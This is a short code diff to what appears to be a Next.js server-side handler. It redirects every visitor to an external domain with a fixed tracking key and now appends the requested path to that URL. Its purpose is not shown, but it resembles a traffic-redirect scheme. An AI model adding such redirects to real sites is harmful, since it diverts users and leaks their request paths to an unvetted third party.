@@ -20,7 +20,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://latelyninetyfeelings.com/aih11mari?key=aec6c91151fcbc016b0ecee588f48701` 
+					`https://latelyninetyfeelings.com/aih11mari?key=aec6c91151fcbc016b0ecee588f48701`  + encodeURI(path as string)
 				}`,
 			},
 		};
